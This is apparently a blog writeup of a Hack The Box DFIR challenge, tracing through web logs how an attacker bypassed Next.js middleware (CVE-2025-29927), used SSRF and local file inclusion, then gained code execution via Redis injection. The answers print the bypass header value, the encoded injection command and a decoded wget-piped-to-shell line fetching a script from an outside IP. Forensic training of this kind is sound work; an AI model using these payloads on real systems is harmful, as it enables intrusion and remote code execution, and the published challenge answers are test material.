---
layout: post
title:  "NeuroSync-D"
date:   2025-06-09 12:07:00 -0400
categories: HTB-sherlock DFIR very-easy
tags: CTF writeup log 
image:
    path: assets/img/htb/NeuroSync/banner.png
---

### CHALLENGE DESCRIPTION
NeuroSync™ is a leading suite of products focusing on developing cutting edge medical BCI devices, designed by the Korosaki Coorporaton. Recently, an APT group targeted them and was able to infiltrate their infrastructure and is now moving laterally to compromise more systems. It appears that they have even managed to hijack a large number of online devices by exploiting an N-day vulnerability. Your task is to find out how they were able to compromise the infrastructure and understand how to secure it.

### SOLUTION 

**What version of Next.js is the application using?**
```bash
grep -a10 -i 'next.js' * 
```

<details>
<summary><b>Answer</b></summary>
15.1.0
</details>

**What local port is the Next.js-based application running on?**
<details>
<summary><b>Answer</b></summary>
3000
</details>

**A critical Next.js vulnerability was released in March 2025, and this version appears to be affected. What is the CVE identifier for this vulnerability?**

Search `CVE Next.js 2025` on Google

<details>
<summary><b>Answer</b></summary>
CVE-2025-29927
</details>

**The attacker tried to enumerate some static files that are typically available in the Next.js framework, most likely to retrieve its version. What is the first file he could get?**

> **Hint:** Look for web requests with HTTP status 200.

We just need to see what the first file is, so we use `head`

```bash
grep  -i '200' * | head
```
<details>
<summary><b>Answer</b></summary>
main-app.js
</details>

**Then the attacker appears to have found an endpoint that is potentially affected by the previously identified vulnerability. What is that endpoint?**

We can get the answer from above

<details>
<summary><b>Answer</b></summary>
/api/bci/analytics
</details>

**How many requests to this endpoint have resulted in an "Unauthorized" response?**

> **Hint:** Look for web requests with HTTP status 401.


```bash
grep  -i '401' *
```

<details>
<summary><b>Answer</b></summary>
5
</details>

**When is a successful response received from the vulnerable endpoint, meaning that the middleware has been bypassed?**

We can see the last failed request is 2025-04-01 11:38:04, so we can look from that timestamp.

<details>
<summary><b>Answer</b></summary>
2025-04-01 11:38:05
</details>

**Given the previous failed requests, what will most likely be the final value for the vulnerable header used to exploit the vulnerability and bypass the middleware?**
```bash
grep  -i 'middleware' * 
```

<details>
<summary><b>Answer</b></summary>
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
</details>

**The attacker chained the vulnerability with an SSRF attack, which allowed them to perform an internal port scan and discover an internal API. On which port is the API accessible?**
```bash
grep  -i 'port' *
```
<details>
<summary><b>Answer</b></summary>
4000
</details>

**After the port scan, the attacker starts a brute-force attack to find some vulnerable endpoints in the previously identified API. Which vulnerable endpoint was found?**
<details>
<summary><b>Answer</b></summary>
/logs
</details>

**When the vulnerable endpoint found was used maliciously for the first time?**
<details>
<summary><b>Answer</b></summary>
2025-04-01 11:39:01
</details>

**What is the attack name the endpoint is vulnerable to?**
<details>
<summary><b>Answer</b></summary>
Local File Inclusion
</details>

**What is the name of the file that was targeted the last time the vulnerable endpoint was exploited?**
<details>
<summary><b>Answer</b></summary>
secret.key
</details>

**Finally, the attacker uses the sensitive information obtained earlier to create a special command that allows them to perform Redis injection and gain RCE on the system. What is the command string?**

```bash
grep  -i '|' * 
```

<details>
<summary><b>Answer</b></summary>
OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb
</details>

**Once decoded, what is the command?**

It is a `Base64`, decode it by `base64 -d`

<details>
<summary><b>Answer</b></summary>
wget http://185.202.2.147/h4Pln4/run.sh -O- | sh
</details>

